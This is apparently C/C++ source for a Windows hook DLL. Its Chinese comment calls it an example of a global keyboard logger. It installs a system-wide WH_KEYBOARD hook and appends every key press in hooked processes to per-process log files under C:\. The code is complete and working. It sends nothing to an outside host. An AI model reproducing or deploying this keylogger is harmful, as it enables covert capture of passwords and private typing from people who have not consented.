
//
// 基于HOOK技术的键盘全局键盘记录的实例(HOOK DLL模块)
//
#include <tchar.h>
#include <stdlib.h>
#include <stdio.h>

#pragma warning(disable: 4995)
#pragma warning(disable: 4996)
#include "adkprecomp.h"
#include "adkfile.h"

#include "../include/utlist.h"

#define HOOKDLL_API extern "C" __declspec(dllexport)


HHOOK g_hook = NULL;


inline void log_print(char *format, ...)
{
	CHAR	szmsg[ADK_DBG_TRACE_BUFLEN];
	HRESULT hResult;

	va_list marker;
	va_start(marker, format);
	hResult = StringCchVPrintfA(szmsg, sizeof(szmsg)/sizeof(szmsg[0]), format, marker);
	if ( STRSAFE_E_INSUFFICIENT_BUFFER == hResult )
	{
		AdkASSERT((!"STRSAFE_E_INSUFFICIENT_BUFFER"));
	}
	va_end(marker);

	OutputDebugStringA(szmsg);

	return ;
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wp, LPARAM lp)
{
	char module[MAX_PATH] = {0};
	GetModuleFileNameA(NULL, module, _countof(module));
	if (code < 0 || strstr(module, "Dbgview.exe"))
	{
		return CallNextHookEx(g_hook, code, wp, lp);
	}

	// save keyboard record to file
	//
	char buf[MAX_PATH] = {0};
	char keyboard_file[MAX_PATH] = {0};
	sprintf_s(keyboard_file, _countof(keyboard_file), "C:\\%s.log", AdkGetFileNameA(module));

	unsigned short repeat_count = LOWORD(wp);
	unsigned short flags = HIWORD(lp);

	if ((flags & KF_EXTENDED))
	{
		log_print("extended \r\n");
	}
	if (flags & KF_ALTDOWN)
	{
		log_print("ALT down \r\n");
	}

	if (!(flags & KF_UP)) // key up
	{
		log_print("code %d, vkey %d, repeat count %d, scan code %d \r\n", code, wp, repeat_count, LOBYTE(flags));

		sprintf(buf, "%d,", wp);
		AdkFileAppendWriterA(keyboard_file, buf, strlen(buf));
	}

	return CallNextHookEx(g_hook, code, wp, lp);
}

HOOKDLL_API int set_hook()
{
	g_hook = SetWindowsHookExW(WH_KEYBOARD, KeyboardProc, GetModuleHandleW(L"hookdll.dll"), NULL);
	if (g_hook == NULL)
	{
		printf("setwindowshookex failed, %d \r\n", GetLastError());
		return -1;
	}

	printf("setwindowshook succeed! \r\n");

	return 0;
}

HOOKDLL_API int stop_hook()
{
	if (FALSE == UnhookWindowsHookEx(g_hook))
	{
		printf("unhookwindowshookex failed, %d \r\n", GetLastError());
		return -1;
	}
	printf("UnHookWindowsHookEx succeed! \r\n");

	return 0;
}